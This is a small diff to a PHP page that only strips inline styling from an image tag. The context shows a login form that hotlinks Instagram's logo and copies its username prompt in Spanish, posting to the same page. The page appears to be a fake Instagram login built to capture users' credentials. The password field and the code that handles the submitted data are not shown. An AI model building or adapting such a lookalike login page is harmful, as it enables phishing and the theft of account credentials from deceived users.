@@ -39,7 +39,7 @@
         } else {
     ?>
     <div class="caja">
-        <img style="display: flex; align-items: center; justify-content: center; text-align: center;" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png">
         <form method="POST" action="">
             <p>Su nombre: </p>
             <input type="text" name="nombre" placeholder="Teléfono, usuario o correo electrónico"><br/>
